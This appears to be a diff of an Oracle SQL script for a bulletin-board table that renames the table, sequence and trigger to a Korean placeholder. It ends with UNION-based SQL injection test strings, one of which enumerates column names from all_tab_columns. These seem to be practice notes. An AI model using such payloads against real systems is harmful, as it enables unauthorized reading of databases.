@@ -1,4 +1,4 @@
-CREATE TABLE bbs1 (
+CREATE TABLE 테이블명 (
   board_number VARCHAR2(10) PRIMARY KEY,
   name VARCHAR2(20),
   password VARCHAR2(20),
@@ -11,13 +11,13 @@ CREATE TABLE bbs1 (
   writetime VARCHAR2(20)
 );
 
-CREATE SEQUENCE bbs1_seq START WITH 1 INCREMENT BY 1;
+CREATE SEQUENCE 테이블명_seq START WITH 1 INCREMENT BY 1;
 
-CREATE TRIGGER bbs1_trigger
-BEFORE INSERT ON bbs1
+CREATE TRIGGER 테이블명_trigger
+BEFORE INSERT ON 테이블명
 FOR EACH ROW
 BEGIN
-  SELECT bbs1_seq.NEXTVAL
+  SELECT 테이블명_seq.NEXTVAL
   INTO   :new.board_number
   FROM   dual;
 END;
@@ -38,3 +38,7 @@ SELECT "1","1","1","1","1","1","1","1","1","1" FROM dual;
 
 SELECT * FROM bbs1
 UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9', '10' FROM dual;
+1 6 2 10
+
+' UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9', '10' FROM dual --
+' union select column_name,'2', '3', '4', '5', '6', '7', '8', '9', '10' FROM all_tab_columns --
